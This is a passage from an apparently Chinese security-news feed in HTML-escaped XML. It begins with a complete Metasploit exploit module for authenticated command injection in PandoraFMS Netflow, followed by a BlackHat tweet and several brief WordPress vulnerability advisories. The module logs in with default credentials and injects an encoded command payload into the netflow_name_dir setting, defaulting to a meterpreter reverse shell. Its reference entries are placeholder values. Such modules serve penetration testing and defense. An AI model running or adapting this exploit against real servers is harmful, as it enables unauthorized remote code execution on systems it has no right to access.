class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; Msf::Exploit::Remote<br>  Rank = ExcellentRanking<br><br>  include Msf::Exploit::Remote::Tcp<br>  include Msf::Exploit::Remote::HttpClient<br>  prepend Msf::Exploit::Remote::AutoCheck<br><br>  def initialize(info = &#123;&#125;)<br>    super(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;PandoraFMS Netflow Authenticated Remote Code Execution&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; %q&#123;<br>          This module exploits a command injection vulnerability <span class="hljs-keyword">in</span> Netflow component <span class="hljs-keyword">of</span> PandoraFMS. The module requires set <span class="hljs-keyword">of</span> user credentials <span class="hljs-keyword">to</span> modify Netflow settings. Also, Netflow binaries have <span class="hljs-keyword">to</span> present <span class="hljs-literal">on</span> the system.<br>        &#125;,<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; MSF_LICENSE,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<span class="hljs-string">&#x27;msutovsky-r7&#x27;</span>], <span class="hljs-comment"># researcher, module dev</span><br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [ <span class="hljs-string">&#x27;OSVDB&#x27;</span>, <span class="hljs-string">&#x27;12345&#x27;</span> ],<br>          [ <span class="hljs-string">&#x27;EDB&#x27;</span>, <span class="hljs-string">&#x27;12345&#x27;</span> ],<br>          [ <span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;http://www.example.com&#x27;</span>],<br>          [ <span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;1978-1234&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; [<span class="hljs-string">&#x27;unix&#x27;</span>, <span class="hljs-string">&#x27;linux&#x27;</span>],<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; [ ARCH_CMD ],<br>        <span class="hljs-string">&#x27;Privileged&#x27;</span> =&gt; <span class="hljs-literal">false</span>,<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [<br><br>          [<br>            <span class="hljs-string">&#x27;Linux/Unix Command&#x27;</span>,<br>            &#123;<br>              <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; [<span class="hljs-string">&#x27;unix&#x27;</span>, <span class="hljs-string">&#x27;linux&#x27;</span>],<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; [ ARCH_CMD]<br>            &#125;<br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2025-12-30&#x27;</span>,<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;DefaultOptions&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;RPORT&#x27;</span> =&gt; <span class="hljs-number">80</span>,<br>          <span class="hljs-string">&#x27;PAYLOAD&#x27;</span> =&gt; <span class="hljs-string">&#x27;cmd/linux/http/x64/meterpreter/reverse_tcp&#x27;</span>,<br>          <span class="hljs-string">&#x27;FETCH_WRITABLE_DIR&#x27;</span> =&gt; <span class="hljs-string">&#x27;/tmp&#x27;</span><br>        &#125;,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [CRASH_SAFE],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [REPEATABLE_SESSION],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [IOC_IN_LOGS, CONFIG_CHANGES]<br>        &#125;<br>      )<br>    )<br><br>    register_options(<br>      [<br>        OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;TARGETURI&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;The base path to PandoraFMS application&#x27;</span>, <span class="hljs-string">&#x27;/pandora_console/&#x27;</span>]),<br>        OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;USERNAME&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Username to PandoraFMS applicaton&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>]),<br>        OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;PASSWORD&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Password to PandoraFMS application&#x27;</span>, <span class="hljs-string">&#x27;pandora&#x27;</span>])<br>      ]<br>    )<br>  end<br><br>  def check<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;index.php&#x27;</span>),<br>      <span class="hljs-string">&#x27;vars_get&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;login&#x27;</span> =&gt; <span class="hljs-string">&#x27;1&#x27;</span> &#125;,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <span class="hljs-keyword">return</span> Msf::Exploit::CheckCode::Unknown(<span class="hljs-string">&#x27;Received unexpected response&#x27;</span>) <span class="hljs-keyword">unless</span> res&amp;.code == <span class="hljs-number">200</span><br><br>    html = res.get_html_document<br><br>    <span class="hljs-keyword">return</span> Msf::Exploit::CheckCode::Unknown(<span class="hljs-string">&#x27;Response seems to be empty&#x27;</span>) <span class="hljs-keyword">unless</span> html<br><br>    version = html.at(<span class="hljs-string">&#x27;div[@id=&quot;ver_num&quot;]&#x27;</span>)&amp;.text<br><br>    @csrf_token = html.at(<span class="hljs-string">&#x27;input[@id=&quot;hidden-csrf_code&quot;]&#x27;</span>)&amp;.attributes&amp;.fetch(<span class="hljs-string">&#x27;value&#x27;</span>, nil)<br><br>    <span class="hljs-keyword">return</span> Msf::Exploit::CheckCode::Safe(<span class="hljs-string">&#x27;Application is not probably PandoraFMS&#x27;</span>) <span class="hljs-keyword">unless</span> version<br><br>    version = version[<span class="hljs-number">1.</span>.]&amp;.sub(<span class="hljs-string">&#x27;NG&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><br>    vprint_warning(<span class="hljs-string">&#x27;Token was not parsed, will try again&#x27;</span>) <span class="hljs-keyword">unless</span> @csrf_token<br><br>    vprint_status(<span class="hljs-string">&quot;Version <span class="hljs-subst">#&#123;version&#125;</span> detected&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> Exploit::CheckCode::Vulnerable(<span class="hljs-string">&quot;Vulnerable PandoraFMS version <span class="hljs-subst">#&#123;version&#125;</span> detected&quot;</span>) <span class="hljs-keyword">unless</span> Rex::Version.<span class="hljs-keyword">new</span>(version) &lt; Rex::Version.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;7.0.777.10&#x27;</span>)<br><br>    Msf::Exploit::CheckCode::Safe(<span class="hljs-string">&#x27;Running version is not vulnerable&#x27;</span>)<br>  end<br><br>  def get_csrf_token<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;index.php&#x27;</span>),<br>      <span class="hljs-string">&#x27;vars_get&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;login&#x27;</span> =&gt; <span class="hljs-string">&#x27;1&#x27;</span> &#125;,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with Failure::UnexpectedReply, <span class="hljs-string">&#x27;Recevied unexpected response&#x27;</span> <span class="hljs-keyword">unless</span> res&amp;.code == <span class="hljs-number">200</span><br><br>    html = res.get_html_document<br><br>    fail_with Failure::UnexpectedReply, <span class="hljs-string">&#x27;Empty response received&#x27;</span> <span class="hljs-keyword">unless</span> html<br>    html.at(<span class="hljs-string">&#x27;div[@id=&quot;ver_num&quot;]&#x27;</span>)&amp;.text<br><br>    @csrf_token = html.at(<span class="hljs-string">&#x27;input[@id=&quot;hidden-csrf_code&quot;]&#x27;</span>)&amp;.attributes&amp;.fetch(<span class="hljs-string">&#x27;value&#x27;</span>, nil)<br><br>    fail_with Failure::NotFound, <span class="hljs-string">&#x27;Could not found CSRF token&#x27;</span> <span class="hljs-keyword">unless</span> @csrf_token<br>  end<br><br>  def login<br>    res = send_request_cgi!(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;index.php&#x27;</span>),<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span>,<br>      <span class="hljs-string">&#x27;vars_get&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;login&#x27;</span> =&gt; <span class="hljs-string">&#x27;1&#x27;</span> &#125;,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt;<br>      &#123;<br>        <span class="hljs-string">&#x27;nick&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>],<br>        <span class="hljs-string">&#x27;pass&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>],<br>        <span class="hljs-string">&#x27;login_button&#x27;</span> =&gt; <span class="hljs-string">&quot;Let&#x27;s go&quot;</span>,<br>        <span class="hljs-string">&#x27;csrf_code&#x27;</span> =&gt; @csrf_token<br>      &#125;<br>    &#125;)<br>    fail_with Failure::NoAccess, <span class="hljs-string">&#x27;Invalid credentials&#x27;</span> <span class="hljs-keyword">unless</span> res&amp;.code == <span class="hljs-number">200</span> &amp;&amp; res.body.include?(<span class="hljs-string">&#x27;id=&quot;welcome-icon-header&quot;&#x27;</span>) || res.body.include?(<span class="hljs-string">&#x27;id=&quot;welcome_panel&quot;&#x27;</span>) || res.body.include?(<span class="hljs-string">&#x27;godmode&#x27;</span>)<br>  end<br><br>  def configure_netflow<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;index.php&#x27;</span>),<br>      <span class="hljs-string">&#x27;vars_get&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;sec&#x27;</span> =&gt; <span class="hljs-string">&#x27;general&#x27;</span>, <span class="hljs-string">&#x27;sec2&#x27;</span> =&gt; <span class="hljs-string">&#x27;godmode/setup/setup&#x27;</span>, <span class="hljs-string">&#x27;section&#x27;</span> =&gt; <span class="hljs-string">&#x27;net&#x27;</span> &#125;<br>    &#125;)<br><br>    fail_with Failure::NotFound, <span class="hljs-string">&#x27;Netflow might not be enabled&#x27;</span> <span class="hljs-keyword">unless</span> res&amp;.code == <span class="hljs-number">200</span><br><br>    html = res.get_html_document<br><br>    fail_with Failure::UnexpectedReply, <span class="hljs-string">&#x27;Unexpected response when trying to configure Netflow&#x27;</span> <span class="hljs-keyword">unless</span> html<br><br>    netflow_daemon_value = html.at(<span class="hljs-string">&#x27;input[@name=&quot;netflow_daemon&quot;]&#x27;</span>)&amp;.attributes&amp;.fetch(<span class="hljs-string">&#x27;value&#x27;</span>, nil)<br>    netflow_nfdump_value = html.at(<span class="hljs-string">&#x27;input[@name=&quot;netflow_nfdump&quot;]&#x27;</span>)&amp;.attributes&amp;.fetch(<span class="hljs-string">&#x27;value&#x27;</span>, nil)<br>    netflow_nfexpire_value = html.at(<span class="hljs-string">&#x27;input[@name=&quot;netflow_nfexpire&quot;]&#x27;</span>)&amp;.attributes&amp;.fetch(<span class="hljs-string">&#x27;value&#x27;</span>, nil)<br>    netflow_max_resolution_value = html.at(<span class="hljs-string">&#x27;input[@name=&quot;netflow_max_resolution&quot;]&#x27;</span>)&amp;.attributes&amp;.fetch(<span class="hljs-string">&#x27;value&#x27;</span>, nil)<br>    netflow_disable_custom_lvfilters_sent_value = html.at(<span class="hljs-string">&#x27;input[@name=&quot;netflow_disable_custom_lvfilters_sent&quot;]&#x27;</span>)&amp;.attributes&amp;.fetch(<span class="hljs-string">&#x27;value&#x27;</span>, nil)<br>    netflow_max_lifetime_value = html.at(<span class="hljs-string">&#x27;input[@name=&quot;netflow_max_lifetime&quot;]&#x27;</span>)&amp;.attributes&amp;.fetch(<span class="hljs-string">&#x27;value&#x27;</span>, nil)<br>    netflow_interval_value = html.at(<span class="hljs-string">&#x27;select[@name=&quot;netflow_interval&quot;]//option[@selected=&quot;selected&quot;]&#x27;</span>)&amp;.attributes&amp;.fetch(<span class="hljs-string">&#x27;value&#x27;</span>, nil)<br><br>    fail_with Failure::Unknown, <span class="hljs-string">&#x27;Failed to get existing Netflow configuration&#x27;</span> <span class="hljs-keyword">unless</span> netflow_daemon_value &amp;&amp; netflow_nfdump_value &amp;&amp; netflow_nfexpire_value &amp;&amp; netflow_max_resolution_value &amp;&amp; netflow_disable_custom_lvfilters_sent_value &amp;&amp; netflow_max_lifetime_value &amp;&amp; netflow_interval_value<br><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;index.php&#x27;</span>),<br>      <span class="hljs-string">&#x27;vars_get&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;sec&#x27;</span> =&gt; <span class="hljs-string">&#x27;general&#x27;</span>, <span class="hljs-string">&#x27;sec2&#x27;</span> =&gt; <span class="hljs-string">&#x27;godmode/setup/setup&#x27;</span>, <span class="hljs-string">&#x27;section&#x27;</span> =&gt; <span class="hljs-string">&#x27;net&#x27;</span> &#125;,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt;<br>      &#123;<br>        <span class="hljs-string">&#x27;netflow_name_dir&#x27;</span> =&gt; <span class="hljs-string">&#x27;;&#x27;</span> + payload.encoded.gsub(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;$&#123;IFS&#125;&#x27;</span>) + <span class="hljs-string">&#x27;#;&#x27;</span>,<br>        <span class="hljs-string">&#x27;netflow_daemon&#x27;</span> =&gt; netflow_daemon_value,<br>        <span class="hljs-string">&#x27;netflow_nfdump&#x27;</span> =&gt; netflow_nfdump_value,<br>        <span class="hljs-string">&#x27;netflow_max_resolution&#x27;</span> =&gt; netflow_max_resolution_value,<br>        <span class="hljs-string">&#x27;netflow_disable_custom_lvfilters_sent&#x27;</span> =&gt; netflow_disable_custom_lvfilters_sent_value,<br>        <span class="hljs-string">&#x27;netflow_max_lifetime&#x27;</span> =&gt; netflow_max_lifetime_value,<br>        <span class="hljs-string">&#x27;netflow_interval&#x27;</span> =&gt; netflow_interval_value,<br>        <span class="hljs-string">&#x27;update_config&#x27;</span> =&gt; <span class="hljs-string">&#x27;1&#x27;</span>,<br>        <span class="hljs-string">&#x27;upd_button&#x27;</span> =&gt; <span class="hljs-string">&#x27;Update&#x27;</span><br>      &#125;<br>    &#125;)<br>    fail_with Failure::PayloadFailed, <span class="hljs-string">&#x27;Failed to configure Netflow&#x27;</span> <span class="hljs-keyword">unless</span> res&amp;.code == <span class="hljs-number">200</span><br>  end<br><br>  def trigger_payload<br>    send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;index.php&#x27;</span>),<br>      <span class="hljs-string">&#x27;vars_get&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;sec&#x27;</span> =&gt; <span class="hljs-string">&#x27;network_traffic&#x27;</span>, <span class="hljs-string">&#x27;sec2&#x27;</span> =&gt; <span class="hljs-string">&#x27;operation/netflow/netflow_explorer&#x27;</span> &#125;<br>    &#125;)<br>  end<br><br>  def exploit<br>    <span class="hljs-comment"># do we have csrf token already</span><br>    get_csrf_token <span class="hljs-keyword">unless</span> @csrf_token<br><br>    login<br><br>    configure_netflow<br><br>    trigger_payload<br>  end<br>end<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; PandoraFMS Netflow Authenticated Remote</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
  </entry>
  
  <entry>
    <title>BlackHatEvents twitter update</title>
    <link href="http://example.com/2025/06/27/twitter_3070689907/"/>
    <id>http://example.com/2025/06/27/twitter_3070689907/</id>
    <published>2025-06-27T13:00:28.637Z</published>
    <updated>2025-06-27T13:00:28.632Z</updated>
    
    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> 准备好参加在#sectorca举行的#BlackHat创业焦点大赛吧！🌟 这是在充满活力的#网络安全世界中闪耀并展示你突破性想法的绝佳机会。立即报名你的#创业项目，提升知名度，与行业领袖建立联系，加速你的成长。决赛选手将争夺参加2026年Black Hat USA的宝贵席位。别错过这个难以置信的机会——你的创新可能成为焦点 &gt;&gt; <a href="https://t.co/IaqE2rEb17">https://t.co/IaqE2rEb17</a></p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1938577072936354227">https://x.com/BlackHatEvents/status/1938577072936354227</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 准备好参加在#sectorca举行的#BlackHat创业焦点大赛吧！🌟 这是在充满活力的#网络安全世界中闪耀并展示你突破性想法的绝佳机会。立即</summary>
      
    
    
    
    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
    
  </entry>
  
  <entry>
    <title>Improper Neutralization of Special Elements used in an SQL Command (&#39;SQL Injection&#39;)</title>
    <link href="http://example.com/2025/06/27/github_2980499533/"/>
    <id>http://example.com/2025/06/27/github_2980499533/</id>
    <published>2025-06-27T13:00:13.627Z</published>
    <updated>2025-06-27T13:00:13.624Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-gqpr-crmw-v8qw">https://github.com/advisories/GHSA-gqpr-crmw-v8qw</a></p><p><strong>CVSS 评分：</strong> 9.3</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52722">https://nvd.nist.gov/vuln/detail/CVE-2025-52722</a></p></li><li><p><a href="https://patchstack.com/database/wordpress/theme/classiera/vulnerability/wordpress-classiera-4-0-34-sql-injection-vulnerability?_s_id=cve">https://patchstack.com/database/wordpress/theme/classiera/vulnerability/wordpress-classiera-4-0-34-sql-injection-vulnerability?_s_id=cve</a></p></li><li><p><a href="https://github.com/advisories/GHSA-gqpr-crmw-v8qw">https://github.com/advisories/GHSA-gqpr-crmw-v8qw</a></p></li></ul><p><strong>描述：</strong></p><p>Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’) vulnerability in JoinWebs Classiera allows SQL Injection. This issue affects Classiera: from n&#x2F;a through 4.0.34.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-gqpr-crmw-v8qw&quot;&gt;https://github.com/advisories/GHSA-gqpr-crmw-v8qw&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>Deserialization of Untrusted Data vulnerability in wpeverest Everest Forms allows Object</title>
    <link href="http://example.com/2025/06/27/github_3110947770/"/>
    <id>http://example.com/2025/06/27/github_3110947770/</id>
    <published>2025-06-27T13:00:12.310Z</published>
    <updated>2025-06-27T13:00:12.308Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-gvc8-gf46-mjvf">https://github.com/advisories/GHSA-gvc8-gf46-mjvf</a></p><p><strong>CVSS 评分：</strong> 9.8</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52709">https://nvd.nist.gov/vuln/detail/CVE-2025-52709</a></p></li><li><p><a href="https://patchstack.com/database/wordpress/plugin/everest-forms/vulnerability/wordpress-everest-forms-3-2-2-php-object-injection-vulnerability?_s_id=cve">https://patchstack.com/database/wordpress/plugin/everest-forms/vulnerability/wordpress-everest-forms-3-2-2-php-object-injection-vulnerability?_s_id=cve</a></p></li><li><p><a href="https://github.com/advisories/GHSA-gvc8-gf46-mjvf">https://github.com/advisories/GHSA-gvc8-gf46-mjvf</a></p></li></ul><p><strong>描述：</strong></p><p>Deserialization of Untrusted Data vulnerability in wpeverest Everest Forms allows Object Injection. This issue affects Everest Forms: from n&#x2F;a through 3.2.2.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-gvc8-gf46-mjvf&quot;&gt;https://github.com/advisories/GHSA-gvc8-gf46-mjvf&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>Deserialization of Untrusted Data vulnerability in BoldThemes Amwerk allows Object Injection</title>
    <link href="http://example.com/2025/06/27/github_3361787495/"/>
    <id>http://example.com/2025/06/27/github_3361787495/</id>
    <published>2025-06-27T13:00:10.928Z</published>
    <updated>2025-06-27T13:00:10.928Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-p7qf-74jx-f6jj">https://github.com/advisories/GHSA-p7qf-74jx-f6jj</a></p><p><strong>CVSS 评分：</strong> 9.8</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52724">https://nvd.nist.gov/vuln/detail/CVE-2025-52724</a></p></li><li><p><a href="https://patchstack.com/database/wordpress/theme/amwerk/vulnerability/wordpress-amwerk-1-2-0-php-object-injection-vulnerability?_s_id=cve">https://patchstack.com/database/wordpress/theme/amwerk/vulnerability/wordpress-amwerk-1-2-0-php-object-injection-vulnerability?_s_id=cve</a></p></li><li><p><a href="https://github.com/advisories/GHSA-p7qf-74jx-f6jj">https://github.com/advisories/GHSA-p7qf-74jx-f6jj</a></p></li></ul><p><strong>描述：</strong></p><p>Deserialization of Untrusted Data vulnerability in BoldThemes Amwerk allows Object Injection. This issue affects Amwerk: from n&#x2F;a through 1.2.0.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-p7qf-74jx-f6jj&quot;&gt;https://github.com/advisories/GHSA-p7qf-74jx-f6jj&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>Deserialization of Untrusted Data vulnerability in pebas CouponXxL allows Object Injection This</title>
    <link href="http://example.com/2025/06/27/github_1319416698/"/>
    <id>http://example.com/2025/06/27/github_1319416698/</id>
    <published>2025-06-27T13:00:09.468Z</published>
    <updated>2025-06-27T13:00:09.468Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-cf6j-797q-26f6">https://github.com/advisories/GHSA-cf6j-797q-26f6</a></p><p><strong>CVSS 评分：</strong> 9.8</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52725">https://nvd.nist.gov/vuln/detail/CVE-2025-52725</a></p></li><li><p><a href="https://patchstack.com/database/wordpress/theme/couponxxl/vulnerability/wordpress-couponxxl-3-0-0-php-object-injection-vulnerability?_s_id=cve">https://patchstack.com/database/wordpress/theme/couponxxl/vulnerability/wordpress-couponxxl-3-0-0-php-object-injection-vulnerability?_s_id=cve</a></p></li><li><p><a href="https://github.com/advisories/GHSA-cf6j-797q-26f6">https://github.com/advisories/GHSA-cf6j-797q-26f6</a></p></li></ul><p><strong>描述：</strong></p><p>Deserialization of Untrusted Data vulnerability in pebas CouponXxL allows Object Injection. This issue affects CouponXxL: from n&#x2F;a through 3.0.0.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-cf6j-797q-26f6&quot;&gt;https://github.com/advisories/GHSA-cf6j-797q-26f6&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>Unrestricted Upload of File with Dangerous Type vulnerability in HaruTheme Drag and Drop Multiple</title>
    <link href="http://example.com/2025/06/27/github_2593956258/"/>
    <id>http://example.com/2025/06/27/github_2593956258/</id>
    <published>2025-06-27T13:00:08.095Z</published>
    <updated>2025-06-27T13:00:08.092Z</updated>
    
